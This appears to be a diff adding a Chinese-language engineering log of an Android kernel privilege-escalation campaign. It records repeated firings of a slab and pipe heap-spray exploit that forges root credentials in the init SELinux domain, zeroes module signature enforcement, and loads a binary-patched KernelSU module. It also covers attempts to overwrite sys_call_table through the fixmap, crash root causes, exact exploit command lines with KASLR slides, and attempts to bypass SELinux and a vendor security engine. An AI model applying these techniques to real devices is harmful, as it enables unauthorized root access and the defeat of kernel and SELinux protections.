+      n=42 -> 后续 n=-1(熔断); s=0xffffffd11beac738(base+0x2ae738) != w -> slot 仍是 ni
+      => ksu_patch_text 未落盘, G-BAD (与 cr0.txt 上一 boot 完全同型)
+  关键发现: kmsg 环仅约 8 秒历史(实测 2162 条 ≈ 70.7s, ~262 条/秒), 必须加载瞬间边抓边存
+
+=== [a63~a65] 2026-11-07 12:47~15:33 诊断 cave 连续两次崩机 ===
+[boot#4] 12:47 boot_id (a63) kk27(kk26 日志改名 KSU) slide=0x1109c00000
+  a63: 打印 "KSU: patch syscall 42, 0xffffffd304cac738 -> 0xffffffd30048cbcc"
+       无 "failed to find phy addr" -> 页表走查成功, fixmap/copy 静默失败, slot[42] 仍 ni
+[boot#5] 15:24 a64 (kk28, cave 误放 .exit.text, .rela.text 旧 0x2f58 未删) -> 加载即崩
+[boot#6] 15:33 a65 (kk29, cave 移入 .text+0x3378) -> 加载后十余秒崩机重启
+  现 boot_id=1332b5a0-62de-4ace-8b86-f23d258f9fc9 uptime=280s
+  设备上 kk29.ko md5=0bae8b00c0cf1e7cb51950ad9335f8e3 -> 崩溃时未落盘, 已全是 0 字节
+  本地 kk29.ko md5=a2f063c540ec39b412fef1a17dc5f72b (3721664B)
+  pstore console-ramoops-0 关键行:
+    KSU: patch syscall 42, 0xffffffd304cac738 -> 0xffffffd30048cbcc   (原始日志)
+    KD1 0000000052c153a8 ffffffd3056153a8                             (D1 诊断成功)
+      x23=phys=0x52c153a8 (phys页|va低12), x20=va=0xffffffd3056153a8
+    Unable to handle kernel NULL pointer dereference at 0x0
+      ESR=0x96000005 ISS=0x5 pc=ksu_register_syscall_hook+0x28 (模块 B+0x33a0 = cave2 入口)
+      lr=ksu_patch_text_cb+0x180 (B+0x2fa0)
+      Code: 911ae108 d280e069 f2e01d09 17fffef1 (f8bfc129)
+      x9=0; x23=0x52c153a8 x22=0xffffff8840eff880 x21=8 x20=0xffffffd3056153a8
+    panic: Oops: Fatal exception -> 重启
+  根因(已确证): .rela.altinstructions 有 PREL32 重定位 addend=0x33a0 (类型261, 指向 .text)
+    => .altinstructions+0x24c 条目: instr=0x33a0, repl=0x33e8
+    => 模块加载时 apply_alternatives 把 cave2 首指令 mov x25,x0(aa0003f9) 改写成
+       0x33e8 处的 ldapr x9,[x9](f8bfc129), 此时 x9=0 -> NULL 解引用 panic
+  结论: cave 不能落在 ksu_register_syscall_hook 内(0x33a0 是 alternatives 打点); a64 同类
+  下步: 选无 alt 打点的 cave(或中和该 alt 条目) / 改用不改代码的诊断方式
+
+=== [a66] 2026-11-07 cave 避开 alt 打点后首枪: 设备不崩但未命中 ===
+[boot#6] 同一 boot_id 1332b5a0-62de-4ace-8b86-f23d258f9fc9  uptime 1201s
+  kk31 = kk30(cave2 由 0x33a0 移到 0x33a4, F1=0x33c8 F2=0x33d8 end=0x33e2)
+  kk31 md5=64df04f789dfea216abaf5d37bc77bfc, 烘 slide=0x2a91c00000 base=0xffffffeaa1c00000
+  设备 md5 一致; 开火前 slabdata(posix_timers)=6
+  a66 结果: 设备存活, 未重启, 未 panic  ← cave 修复有效
+    attempt1: victim=21515 timers=631 holes=0 recs=631 slabs=22 | MISS
+      zombie=Z comm='exe' in 112923us | go+380us det+23us kill+403us
+    attempt2: slabdata=37 > 33 → 弃用 victim
+    attempt3: recs=633(okc=631 多2) slabdata=41 > 33 → 弃用
+    attempt4: slabdata=45 > 33 → 弃用
+    VERDICT: 4 次全部未拿到 → GATE 未过, 模块未加载, 无 KD1/KD2
+  判读: 本 boot 已被本次 4 枪泄漏污染(slabdata 6→45); 该漏洞只在干净 boot 首枪可靠
+  下步: 需重启拿干净 boot → 重新算 slide → 重烘 kk31 → 首枪
+
+=== [a67-crash] 2026-11-07 pstore 崩机分析 (boot beb57c51) ===
+  证据源: /sys/fs/pstore/console-ramoops-0 (507462 B) → logs/ramoops_beb57c51.txt
+  [89.840057] KernelSU: sys_call_table=0xffffffdcbd615258
+  [89.853057] sys_ni_syscall=0xffffffdcbccac738, ni_syscall 1: 42
+  [89.853088] KSU: patch syscall 42, 0xffffffdcbccac738 -> 0xffffffdc8886dbcc
+  [89.853149] KD1 0000000052c153a8 ffffffdcbd6153a8   ← phys / target VA
+  [89.853210] KD2 0                                    ← copy_to_kernel_nofault 返回 0
+  [89.853210] (紧跟一行二进制乱码)
+  [89.853210] KSU G-BAD t=ffffffdcbd615258 n=42 s=ffffffdcbccac738 w=ffffffdc88860454
+  [227.677764] KernelSU: hook_manager: ksu_hook_manager_exit called   ← 卸载开始
+  [227.679626] unregister hooks nr=147/221/281/79/48
+  [227.679626] KernelSU: restore syscall 42 to 0xffffffdcbccac738
+  [227.679718] KD1 0000000052c153a8 ffffffdcbd6153a8 ; [227.679748] KD2 0
+  [227.679748] (乱码一行) ; [227.679748] all syscall hooks restored / ksu_core_exit
+  [227.680175] Unable to handle kernel paging request at 0x400001  ESR=0x96000005
+    pc=dput+0x5c/0xf1c lr=dput+0x28  x19=x20=0x400001  x24=x26=0xdead4ead(SLUB毒值)
+    Call trace: dput ← path_put ← ksu_observer_exit+0x60 ← kernelsu_exit+0x44 ← __arm64_sys_delete_module
+    Code: b946eac8 aa1303f4 11000508 b906eac8 (38458688)
+  [227.681335] Kernel panic - not syncing: Oops: Fatal exception → 重启
+  反汇编 kk32 0x2f80-0x2f98: dst = movz/movk 拼出 0xFFFFFFFEFE5FE000 | (phys&0xfff)
+    → 该常数等价 FIXADDR_TOP=0xFFFFFFFEFEA00000 (builder 内核布局), 与本机不一致
+  判读: copy 返回 0 但 table[42] 未变 → 写入的 dst VA 不在 __set_fixmap 装表的位置
+        写命中活跃内存(乱码/毒值) → 卸载时同一次错位写后 0.43ms 触发 dput Oops
+        根因 = 模块内写死的 fixmap 基址与本机内核不匹配
+  下步: 用本机正确 fix_to_virt(0x402) 改写该常数, 或改走线性映射别名(phys+PAGE_OFFSET)
+
+
+=== 2026-11-07  kk33 修复（未开火：未push / 未insmod / 未重启） ===
+[kk32 运行实测，ramoops_beb57c51.txt 3201-3254]
+KD1  phys=0x0000000052c153a8  dst=0xffffffdcbd6153a8
+     -> 0x50080000(镜像物理基址)+0x2b95258(sys_call_table偏移)+0x150 = 0x52c153a8，自洽
+KD2  copy_to_kernel_nofault ret=0
+G-BAD t=0xffffffdcbd615258 n=42 s=0xffffffdcbccac738 w=0xffffffdc88860454
+G-BAD t=0xffffffdcbd615258 n=-1 s=0x0000000000000000 w=0xffffffdc88860454
+     写入值 0xffffffdc8886dbcc = .text+0x10bcc (CFI桩)
+     守卫期望 0xffffffdc88860454 = .text+0x3454 (dispatcher本体)
+     差 0xD778 -> 守卫比较目标错误（原代码两处 adrp/add 均指向 ksu_syscall_dispatcher addend=0）
+
+[静态反汇编结论]
+copy_to_kernel_nofault @0x39f3dc: 纯 ldr/str 循环，无 access_ok，仅 fault 时 mov x0,#-0xe
+     -> ret=0 表示 8 字节 store 确实执行且未异常
+__set_fixmap @0x101a98: idx 合法范围 1..0x5C6
+     set 路径(old无效): str new,[bm_pte+idx*8] + dsb ishst/isb，不做 TLBI
+     set 路径(old有效且属性/物理不同): 清项 + tlbi vmalle1is + dsb ish + isb + 重写
+     clear 路径: 清项 + 逐页 tlbi vaale1is + dsb ish + isb
+bm_pte nominal 0xffffffc01377a000 -> runtime 0xffffffdcbe222000
+idx=0x402 -> VA 0xFFFFFFFEFE5FE000 -> pte_index=510（pmd[498] 窗口），三者自洽
+MAIR_EL1=0xF40C0400BB44FFFF -> AttrIndx0 = Normal WB，fixmap prot 0x00E8000000000703 正确(RW/AF/inner-shareable)
+KD1 证明物理地址计算完全正确 -> 排除 pgd/pmd/pte walk、memstart、符号烘焙
+
+[kk33 改动，基于 kk32.ko]
+1) .text+0x2f94  bfxil x0,x23,#0,#0xc  ->  bl 0x3724 (cave_pre)
+   cave_pre: 重建 fixmap VA -> tlbi vmalle1is; dsb ish; isb（陈旧 TLB 修复本体）
+             保存 x1/x2 -> printk "KP1 p=%lx v=%lx r=%lx" = phys / fixmapVA / 写前读回
+             恢复 x0/x1/x2 -> ret（保证 copy 的参数不变）
+2) .text+0x2f9c  bl 0x33a4 -> bl 0x3764 (cave_post)
+   cave_post: printk "KP2 r=%lx a=%lx t=%lx" = copy返回值 / fixmap写后读回 / sys_call_table[42]实值
+              x22 = copy返回 -> b 0x2fa0
+3) 守卫比较目标修正: 0x63a8/0x63ac/0x63ec/0x63f0 的 ksu_syscall_dispatcher
+   addend 0 -> 0xD778（.text+0x3454 -> .text+0x10bcc）
+4) cave 占用 .text+0x3724..0x37cc（ksu_create_file_wrapper，全模块 0 引用、无 altinstructions 打点）
+   该区间 51 条旧重定位全部丢弃；确认无任何 .rela.* 引用该符号
+5) 新增 2 条 printk CALL26（.text+0x3750 / 0x378c）；.rela.text 3751 -> 3701 条，重写至 0x38c9c0
+6) 无新增 KASLR 绝对常量，本次不做 bake
+
+[产物]
+kk33.ko  size=3810488  md5=10c4934fafc853159dca52fb1f5801d5
+（未 push / 未 insmod / 未 reboot）
+
+[下次开火判读表]
+KP1 r == 0xffffffdcbccac738 -> fixmap 映射正确指向 sys_call_table 页
+KP2 a == 新值 且 t == 旧值 -> 映射/一致性异常（需查 pmd[498] 是否指向 bm_pte）
+KP2 a == 旧值             -> 写入被静默丢弃（EL2/stage-2 保护）
+守卫 G-OK，或 G-BAD 中 s == 0xffffffdc8886dbcc (.text+0x10bcc) -> 补丁生效
+
+
+==================== 2026-11-07 21:0x kk33 崩溃根因 + kk34 首次加载成功 ====================
+[1] kk33 panic（boot 4b970c81，uptime 821.010772s）
+    esr=0x2000000 (EC=0x00 Invalid/Undefined, IL=1)  far=0x137fc000
+    pc=ksu_create_file_wrapper+0x2c/0x290 = .text+0x3750 = base+0x3750 (base=0xffffffd0f060f000)
+    lr=ksu_patch_text_cb+0x178/0x204 = .text+0x2f98（bl cave_pre 的返回址）
+    Code: aa0003e3 f9400001 aa1703e2 10000280 (d400356f)
+    本地文件 0x3750 = d503201f (nop)；内核 CALL26 重定位只改 imm26、保留 opcode：
+        d503201f & 0xFC000000 = d4000000 ; |imm26(0x356f) = d400356f
+        → 0xd4xxxxxx 为 AArch64 未分配编码 → Undefined instruction
+    根因：printk 调用占位写成 nop，CALL26 占位必须是 bl 的 opcode 0x94000000
+    旁证：x0=0xffffffd0f061279c(=base+0x379c 格式串, ADR 成功)
+          x1=0xffffffd1050ac738(写前读回=sys_call_table[42] 原值, 成功)
+          x2=0x0000000052c153a8(phys)，x3=0xfffffffefe5fe3a8(fixmap VA, 与 __fix_to_virt(0x402)+0x3a8 自洽)
+[2] kk34 修复与构建
+    build_kk33.py PRINTK 占位改 struct.pack('<I',0x94000000)
+    out kk34.ko size=3810488 md5=a1218fc1c2839263be444a0539b76cfe
+    校验：0x3750/0x378c=0x94000000；reloc(0x3750,0x378c) sym=799(printk) type=283 addend=0
+[3] 开火记录（boot 9343af26 之前一个 boot）
+    20:50:34 slide=0x2b19600000 md5=0f961c97e3e12f4f26676eb910af1acb
+      attempt1 几何脏 recs=638/631 多=7 → 弃用；attempt2/3/4 slabdata=37/41/45 > 33 → 全弃用
+      victim 泄漏导致 slabdata 由 6→45；未崩溃
+    20:53:28 清理后重开（slabdata 11）
+      B15 gate fail readback=0 → PARKED，模块未加载；轮询期内 uptime 860 未崩
+      后续该 boot 在 uptime 1691.448089s 崩：Unable to handle kernel paging request
+        va=000b537aba25acc4, ESR=0x96000004, EC=0x25 DABT, pc=release_task+0x2a4,
+        Modules linked in: 空 → kk34 未加载，属 PARKED 伪 task/cred 回收踩脏指针
+[4] 开火成功（boot 9343af26-3be5-4fe8-bf69-7b9b07cd9465）
+    前置：uptime 342.48s，posix_timers slabdata 6/6(180 obj)，relay=Guarded handler invoked once
+          slide=0x234c200000 (base=0xffffffe35c200000)，tracing_on=1
+          bake imm_sites=1 syms=188 delta=0x6a1800000
+          md5=ff2137c6d5f4670e1007dcaf775ee0e8 size=3810488（设备双向一致）
+    21:01:50 开火：wr93d -I -U FCFORK -m kk34.ko -t -W -s 0x234c200000 -n 631 -p 60 -g 8 -y 1200 -a 4
+      stage1: B15 GATE=PASS mine_unmov=1 mt=0 ord=0 free_cnt=3 alloc_round=2
+              B17 reap status=0x9；B21 pwrite=128；B22 open2 uhid=135
+      fake_cred=0xffffff82fe3db100 tsec=0xffffff82fe3db1c0 sid=68 (u:r:init:s0)
+      sig_enforce(0xffffffe35f72d468)<-0；real_cred/cred<-0xffffff82fe3db100
+      const_caps_ready(0xffffffe35f9fc6bc)<-1；bti key(0xffffffe35f9fc660)<-0
+      probe pid=16433 comm: wp..→FC_CALL→FC_OK0→FC_DONE 存活
+      [F] module kk34.ko 预读完成 3810488/3810488 bytes
+      /proc/modules: kernelsu 147456 0 - Live (OE)  ★加载成功，无 panic
+      uptime 594.21s 仍 Live
+[5] su 现状
+    /system/bin/su 不存在；/data/adb Permission denied（shell 无 root）
+    ksutest2: reboot(0xDEADBEEF,0xCAFEBABE,0,&fd) → EPERM(1)，通道未建立
+    本 build 只注册 setresuid/execve/newfstatat/faccessat 四个 syscall hook（syscall_hook_manager.c:135-138）
+    reboot fd 安装仅在 CONFIG_KSU_TRACEPOINT_HOOK 下注册 kprobe，本 build 未启用
+    → 取 su 的正确路径是 execve("/system/bin/su") 命中 sucompat.c:223，
+       若 /data/adb/ksud 存在则转 exec ksud，否则 fallback /system/bin/sh（需先能写 /system/bin/su 或 /data/adb）
+================================================================================
+[6] 清理与 su 阻塞分析（2026-11-07，boot 9343af26，全程未重启）
+- 已按 PID 清理 filler：16434-16439、16449、16450；16449/16450 变 zombie（父 16413 不 reap）
+- 严禁 kill：16413（父，持 60 个 pipe，杀掉会释放别名页）与 16433（probe，task->pid 已清零，do_exit 会 panic；见 fork_escape_spec/spec.md L9）
+- 清理后：uptime 800s+，boot_id 不变，/proc/modules 仍 kernelsu Live
+- sucompat 门禁链（源码核对）：
+    sucompat.c L157/L220  -> ksu_is_allow_uid_for_current(current_uid())
+    allowlist.c L300-307  -> uid==0 ? is_ksu_domain() : __ksu_is_allow_uid(uid)
+    allowlist.c L128-133  -> forbid_system_uid(uid) = (uid < 2000 && uid != 1000)  ⇒ uid 2000 不被禁
+    allowlist.c L279-286  -> manager uid 恒允许；allow_shell && uid==SHELL_UID(2000) 恒允许
+    init.c L147-151       -> allow_shell = defined(CONFIG_KSU_DEBUG) ? true : false
+    init.c L303           -> module_param(allow_shell, bool, 0)（perm=0，无 sysfs 节点，只能加载时传参）
+  ⇒ 非 DEBUG build 且 allow_list 为空（无 manager）⇒ uid 2000 恒被拒
+- /system/bin/su 不存在不是阻塞：execve hook 在 open 前把 filename 改写为 /data/adb/ksud（存在则转）否则 /system/bin/sh
+- 三种解释待区分：H1 allow_shell=false（hook 已生效）；H2 CONFIG_KSU_DEBUG=1 但 hook 未生效（syscall 42 补丁没落地）
+  判别器：init.c L193-195 allow_shell 为真时必有 pr_alert "shell is allowed at init!"，可在 /dev/kmsg 读到（init 域 root 可读）
+- 方案A（推荐，不重启）：fork-escape 子进程(init域uid0全caps) -> 读 /dev/kmsg 取 KP1/KP2/G-OK 与上面那行
+  -> delete_module("kernelsu") -> finit_module(/data/local/tmp/kk34.ko, "allow_shell=1")
+  -> shell 执行 /system/bin/su，hook 改写为 /system/bin/sh 并提权 ⇒ 落地 root
+- 方案B：不改模块，用 init 域 root 子进程做常驻命令通道（拿不到 su 名称）
+================================================================================
+[7] 21:15:06 RELOAD 开火失败（boot 9343af26，uptime 1200s，未重启）
+    载荷：wr93f = wr1.c + -U RELOAD（fc_fork_escape 内 delete_module(106,"kernelsu",O_NONBLOCK)
+          + finit_module(273, fd, "allow_shell=1", 0)，kmsg 过滤新增 shell is allowed/syscall hook）
+          size=2358800 md5=8279ad0d97fa55bc6eef2af879d53552（设备一致）
+    前置：relay=Guarded handler invoked once，tracing_on=1，slide=0x234c200000，slabdata 13，模块已 Live
+    结果：B15 GATE=FAIL (mine_unmov=0 mine=0 any=0 mt=-1 ord=-1) | alloc_round=0 free_cnt=2
+          目标 pfn=3122663 在 8 轮 pipe 喷涂中始终未被分配；free 事件只有 pfn=3122662(order=1)
+          → 目标 order-1 slab 的尾页未回到 buddy（首轮开火残留对象仍占用该 slab）
+          == VERDICT: PARKED（不 reap，挂起）；RELOAD 分支从未执行
+    现场：uptime 1310s 存活，模块仍 Live，slabdata 17(361/510)，残留 wr93f 主 20460 + 9 子
+    风险：PARKED 是延时炸弹（20:53 那次在 uptime 1691.45s 崩 release_task+0x2a4）
+[8] 结论：同一 boot 内二次开火不可靠（首轮残留污染 slab 几何）。RELOAD 必须作为**该 boot 的第一次开火**，
+    由父进程正常加载 kk34(allow_shell=0)，子进程再 delete+finit("allow_shell=1")，一步到位。
+================================================================================
+[9] 21:39:39 wr93g(allow_shell=1 加载参数) 开火（boot 3cfd6155，uptime 318.83s，slabdata 6/6）
+    载荷：wr1.c 三处 syscall(SYS_init_module,...,"") -> "allow_shell=1"；size=2358800
+          md5=332fbf91af8b1342d10e1e9049616f55（设备一致）
+    slide=0x192ae00000 base=0xffffffd93ae00000，kk34.ko md5=248aa7fb0ee58545dbbc9ee92be183a1
+    结果：开火 5s 即 kernelsu Live，90s 全程稳定，设备未崩
+          probe comm: FC_CALL -> FC_OK0 -> FC_DONE（init_module rc=0，参数已生效）
+          /proc/modules: kernelsu 147456 0 - Live (OE)
+    su 验证：/system/bin/su -> rc=127；test -e -> STAT_NO；test -r -> ACC_NO；ls -> No such file
+          ⇒ allow_shell=1 已加载但 newfstatat/faccessat/execve 三个 hook 均未伪造 su 路径
+          ⇒ sys_call_table 的补丁**没有真正落地**（读 fixmap VA 正确，写被静默丢弃）
+    与 kk33 的 KD1 一致：x1 读回 = 表原值 0xffffffd1050ac738 → 映射可读；但写后从未证实
+[10] 下一步：用 -U FCIMPX（模块加载成功后由 uid0/init域/满caps probe 执行 /data/local/tmp/act.sh）
+     让 act.sh 跑 dmesg 落盘 /data/misc/perfetto-traces/kmsg.txt，取 KP1/KP2/G-OK 定性写入是否被 EL2 丢弃
+================================================================================
+[11] 2026-11-07 22:0x  根因定性（静态证据，无需开火）
+  结论：KernelSU 当前构建的 syscall 拦截机制在本内核上**根本不存在**，与 allow_shell/allowlist 无关。
+  A. hook 实现路径（源码）：
+     kernel/hook/syscall_hook_manager.c L140-149  register_trace_sys_enter(ksu_sys_enter_handler)
+     L96-121 handler 收到 sys_enter 后把 current_pt_regs->syscallno 改写为 ksu_dispatcher_nr
+     L135-138 只注册 4 个 hook：__NR_setresuid / __NR_execve / __NR_newfstatat / __NR_faccessat
+     → 没有 sys_enter tracepoint，4 个 hook 一次都不会被调用
+  B. 本内核配置：
+     logs/cfg9000.txt L6604  # CONFIG_FTRACE_SYSCALLS is not set
+     kernel/trace/Makefile L54  obj-$(CONFIG_FTRACE_SYSCALLS) += trace_syscalls.o  → 不编译
+     cfg9000.txt L733  # CONFIG_KPROBES is not set（kprobe 备用路径同样没有）
+  C. 现场证据（adb shell，只读）：
+     /sys/kernel/tracing/events/ 列表里有 raw_syscalls，**没有 syscalls**
+     ⇒ sys_enter/sys_exit tracepoint 在本机不存在
+  D. 第二道坎（即使 hook 修好）：
+     sucompat.c L176-193 命中 /system/bin/su → filename 改成 /data/adb/ksud
+     若 execve(ksud) 失败则回落 /system/bin/sh（L189）→ 所以 ksud 缺失不致命，仍能拿到 root shell
+     但 /data/adb 在 shell 侧 Permission denied（FBE/ENOKEY），ksud 不存在
+  E. 因此 B 路线的正确修法（不依赖 tracepoint）：
+     1) 把 sys_call_table[execve/newfstatat/faccessat/setresuid] 直接写成 ksu_syscall_dispatcher
+     2) 改 dispatcher 两处守卫（syscallno != dispatcher_nr / syscallno == orig_nr），
+        直接改表时 x8 已等于真实 nr，必须放行
+     3) 影子表：hook 内部 ksu_syscall_table[orig_nr](regs) 会递归到 dispatcher，
+        需把模块全局 ksu_syscall_table 指向一份原始表副本，再写真实表
+  F. 待验证的关键未知：sys_call_table 的写入是否被 EL2/只读页静默丢弃（kp1/kp2 从未读到）
+[12] 2026-11-07 22:0x  取证载荷升级 wr93i（已编译并 push）
+     源码 d:\98260\src\wr1.c：kmsg_dump_file → probe_dump()
+       - syslog(READ_ALL,1MB) 全环落盘
+       - /proc/kallsyms 过滤 sys_call_table / sys_ni_syscall / ksu_* / trace_sys_enter / text_poke / set_fixmap
+       - /proc/modules 过滤 kernelsu
+       - /sys/fs/selinux/enforce、stat(/data/adb)、stat(/data/adb/ksud)
+       - 落盘优先级 /data/misc/perfetto-traces/act_root.txt → /data/act_root.txt → /data/local/tmp/act_root.txt
+     编译：NDK r27c aarch64-linux-android31-clang -O2 -static（1 warning: wr1.c:1924 C23）
+     wr93i size=2360928 md5=2360d7e64d3080d1f340c9f93d85aed0（设备一致）
+     开火脚本 logs/p33_fire.py 已改：wr93i -I -U FCFORKACT，日志 a72.log
+================================================================================
+[13] 2026-11-07 22:28:56  uptime 180s 开火 → B15 gate FAIL（未加载模块，设备未崩）
+  boot_id = 93267fd3-71b3-41a6-876f-173376899733
+  slide   = 0x2214e00000 base=0xffffffe224e00000
+  kk34(烘焙) md5=953d4692f8998a6418275714056ec332 size=3810488（设备一致）
+  开火时刻 uptime=183.18s（按用户要求 180s 窗口）
+  目标 slab: pfn=3297674 cnt=30 arm_i=58；目标尾页 pfn=3297675
+  前 8 组 cnt:pfn = 29:3297478 30:3297674 30:2984524 30:2984526 30:3297752 30:3297754 30:3297756 30:3297758
+  B13 喷洒 8 轮：
+    r1 pipe=2048/total2048 free(n=2) alloc(pfn=3297675 n=0 mine=0) cum_free=2
+    r2 pipe=2048/4096   free(n=0) alloc(n=0) cum_free=2
+    r3 pipe=2048/6144   free(n=0) alloc(n=0) cum_free=2
+    r4 pipe=2048/8192   free(n=0) alloc(n=0) cum_free=2
+    r5 pipe=2048/10240  free(n=0) alloc(n=0) cum_free=2
+    r6 pipe=2048/12288  free(n=0) alloc(n=0) cum_free=2
+    r7 pipe=2048/14336  free(n=0) alloc(n=0) cum_free=2
+    r8 pipe=1024/15360  free(n=0) alloc(n=0) cum_free=2
+    期间 trace 显示 ksoftirqd/0 在 197.9/198.2s 释放 pfn=3297674 order=1 两次
+  B15 GATE=FAIL：target 被本进程 UNMOVABLE 拿到=0、本进程任意=0、任意进程=0；alloc_round=0 free_cnt=2
+  VERDICT: PARKED（不 reap，保持挂起；readback=0）
+    pid=15149 oom_score_adj 已降到 -1000，防 OOM 杀挂起实例
+    已释放 60 个 pipe 的配额（仅归还 pipe-user-pages，不碰 victim）
+  设备状态：未加载 kernelsu（grep -c=0）、未重启、loadavg 33.35/23.85/10.82、
+            MemFree≈7.27GB、线程 6695
+  结论：180s 窗口过不了 B15 闸门（目标尾页从未被本进程以 UNMOVABLE 拿到），
+        历史上稳定窗口是 uptime≥300s；同 boot 二次开火此前多次不可靠，优先重启后再打
+================================================================================
+[11] 2026-11-07 23:37 kk35 分支标记开火 (boot b1648962, slide=0x1c57800000, md5=7d5bdb66)
+  KPM lr=ffffffdbfc2a4f5c t=ffffffdc6a4153a8 c=52c153a8  -> 落点A(0x2f58) fixmap 分支确实进入
+  KD1 0000000052c153a8 ffffffdc6a4153a8 -> phys 自洽
+  日志在此处终止: 无 KP1/KP2、无 KPB/KPC、无 Kernel panic 文本
+  -> 在 __set_fixmap(0x402) 写表项瞬间被静默复位
+  重启后 boot 96e7fbd4; pstore_a76_console.txt 524276B / pstore_a76_dmesg.txt 218293B
+  结论: sys_call_table 只读页写入触发安全引擎复位(HISEC kcode/kcode-syscall/se-hook 密集)，该路线不可用
+
+[12] 2026-11-07 23:56 kk36 = kk34 + nop(.init.text+0x68 = bl ksu_syscall_hook_init), md5=1cd7442e, 烘后 da96b197 (slide=0x2329200000)
+  wr93l 新增 -U SHELL:<cmd>; 开火后: kernelsu 模块 Live(count=1), 设备未复位, uptime 持续
+  probe PID 20308 USER=root (逃逸成功), 其子 20447 也 root
+  但 SHELL: 被当成路径 exec, 命令未真正执行 -> 输出为空
+  结论: 不碰 sys_call_table 即可稳定加载并拿到 root 进程; 只差"root 进程执行命令并回传输出"这一环
+
+[13] 2026-11-08 00:11 SHELL 分支修复验证 (boot 7b2c0236, slide=0x19e7200000, 烘后 kk36 md5=fd3102e3, wr93m md5=dd42eb40)
+  修复: wr1.c SHELL: 分支补 g_fcimp=1（原缺此项 -> fakecred_run 不进 init_module 块, [S] 永不执行）
+  开火 a77.log: WINDOW HIT (attempt 1) victim=17182 probe=17155
+    B13 r1 pipe=2048  free(n=1) alloc(n=0) cum_free=1
+    B13 r2..r8 alloc(n=0)  cum_free=1
+    B15 GATE=FAIL (mine_unmov=0 mine=0 any=0) | alloc_round=0 free_cnt=1
+    VERDICT: PARKED; kernelsu count=0; 未复位
+  随后误操作: 未汇报直接二次开火 a78.log -> 0 字节、无 wr93m 进程（未跑起来）
+
+[14] 2026-11-08 00:19 重启后重打 (boot 3a640e95, slide=0x1c4e400000, 烘后 kk36 md5=399d49bf, wr93m md5=dd42eb40)
+  PRE: uptime=316s; relay ONETAPROOT ok; tracing_on=1
+  开火 a79.log: pid=15999, WINDOW HIT (attempt 1) victim 页 pfn=3283259 (order=1 block 3283258)
+    B13 r1 pipe=2048  free(n=2) cum_free=2
+    B13 r2: mm_page_alloc pfn=3283259 order=0 mt=0 GFP_USER|__GFP_ZERO by pid=1 -> 目标页被其它进程抢走
+    B13 r2..r8 alloc(n=0) cum_free=2
+    B15 GATE=FAIL (mine_unmov=0 mine=0 any=0) | alloc_round=0 free_cnt=2
+    VERDICT: PARKED; kernelsu count=0; 未复位
+  清理: pkill wr93m + kill 子进程, MemFree 7224MB, 无残留
+  结论: 页回收竞态仍未命中; 目标页 free 后先被 pid=1(GFP_USER) 抢走, 需要在 free 后立即以 UNMOVABLE 抢占
+
+[15] 2026-11-08 00:33 重启重打 (boot 3a018dc2, slide=0x116fa00000, 烘后 kk36 md5=6ee21509, wr93m md5=dd42eb40)
+  a80 首启失败: 0 字节/无进程 -> adb 会话销毁竞态, 改为 nohup+setsid+尾部 sleep 3 保活
+  a81 重发成功启动 pid=16633; 利用链全通: 命中 sid=68 u:r:init:s0, cred/task/avc 改写全 rc=0
+    init_module rc=0 errno=0 (comm W2_r0_e0); /proc/modules kernelsu count=1; 设备未复位
+    probe pid=16654 Uid=0 0 0 0, attr/current=u:r:init:s0 (已确认 root+init 域)
+  阻塞点: 逃逸后 probe 再无任何输出; [S] 未出现; init_module 之后停在取证/exec 段, 进程 state=S 挂起
+    根因1: act_scan_bypass 报 rc=0, 但 /sys/fs/selinux/enforce 仍为 1 -> selinux_state 写未生效
+    根因2: 逃逸到 init_t 后, 对 shell 域创建的 pipe 写被 SELinux 拒, [K]/[S] 输出全部丢失
+    根因3: init_t 对 /system/bin/sh(shell_exec) 无 entrypoint/transition 权限 -> exec 被拒后 pause
+  现场: 无 sunbin(/system/bin/su 不存在); /data/adb/ksu 存在但 shell 无权; a81.log 6567B 不再增长
+  结论: kk36 可稳定加载并拿到 root+init 域进程; 但输出通道与 exec 都卡在 SELinux enforcing
+
+==== [15] 2026-11-08 01:23-01:27  boot d6125f3d  slide 0x1689200000  SHELLX 首测 ====
+a83/a84: 4次尝试全被 slabdata 闸拒(41/57>33) 未命中窗口
+清理: 保留锚点进程 18571; slabdata 57->11
+a85: WINDOW HIT(attempt1) GATE=FAIL(mine_unmov=0 mine=0 any=0) VERDICT=PARKED; 未崩
+reboot -> d6125f3d, uptime 315.88 时 pre: slabdata 6/6, slide 0x1689200000
+a86: WINDOW HIT(attempt1) + B15 GATE=PASS(1/1/1) alloc_round=5 free_cnt=2 -> STAGE1 桥就绪
+     [F] SIDFIX sid=2008; avc_node ssid=tsid=2008 rc=0; [A17] const_caps_ready rc=0
+     [U] root_probe_patch rc=0; [U] 放行 probe 执行 SHELLX
+     阻塞: 源码 exec 块嵌在 if(g_fcimp) 内, g_nomod 跳过模块加载后直接 pause, 无 [S] 输出
+     设备未崩, kernelsu count=0
+fix: wr93q 增加独立 g_nomod exec 分支 (md5 6A72A50FC067952D6B9080CCF0E0D6B2, 2361352B)
+
+[16] 2026-11-08 16:2x DAEMONX 验证（wr93w，含 trace_marker 打点）
+- boot=eecf6997 uptime=473s slabdata_before=6 slide=0x1c5f600000
+- 命令: SIDCTX=u:r:init:s0 SIDFIX=68 ./wr93w -I -U 'DAEMONX:kk98260' -t -W -s 0x1c5f600000 -n 631 -p 60 -g 8 -y 1200 -a 4
+- 结果: [B15] GATE=FAIL (mine_unmov=0 mine=0 any=0) alloc_round=0 free_cnt=1 → VERDICT: PARKED
+- probe 未唤醒（trace 无 KK 行），@kk98260 未绑定，kkcli connect ENOENT
+- 清理（按新硬规则）: 保留锚点 PID 16656；清理 16701/16702 + 16685..16691 共 9 个
+- 清理后: slabdata 17→13, MemFree 5842MB, loadavg 33.00/31.07/18.86, anchor 16656 存活
+
+[17] 2026-11-08 16:36 DAEMONX 第二枪（wr93w，重启后）
+- boot=2db43cff uptime=330s slabdata_before=6 slide=0x2700400000
+- 命令同 [16]（SIDCTX=u:r:init:s0 SIDFIX=68 DAEMONX:kk98260）
+- 结果: [B2f] 放行 recs=633(okc=631) 目标 pfn=3042050 cnt=30；4 次尝试全部 hit+discard → VERDICT 未拿到
+- trace 无 KK 行，@kk98260 未绑定，kkcli ENOENT
+- 清理: 保留锚点 15778，清理 12 个子进程（5 个转 Z）
+- 清理后: slabdata 11, MemFree 6865MB, loadavg 32.68/26.29/13.22
+
+[18] 2026-11-08 16:44 DAEMONX 第三枪（wr93w）★关键进展
+- boot=a896dee0 uptime=330s slabdata_before=6 slide=0x19ad600000
